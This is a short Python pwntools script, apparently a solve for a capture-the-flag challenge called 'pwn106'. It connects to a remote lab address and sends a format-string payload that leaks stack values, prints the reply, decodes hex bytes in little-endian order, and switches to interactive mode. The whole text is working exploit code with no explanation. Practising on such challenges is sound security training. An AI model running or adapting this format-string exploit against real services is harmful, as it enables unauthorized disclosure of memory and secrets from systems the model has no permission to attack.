
from pwn import *

#context.log_level = "debug"


p = process('./pwn106-user-1644300441063.pwn106-user')
p = remote('10.10.127.226', 9006)
p.sendline(b'%6$p-%7$p-%8$p-%9$p-%10$p-%11$p-%12$p')
#p.recv()

recv = p.recv()

#recv = str(recv).split(' ')[-1].strip("'").split('-')

print(recv)

x = lambda y : bytes.fromhex(y)[::-1]
p.interactive()
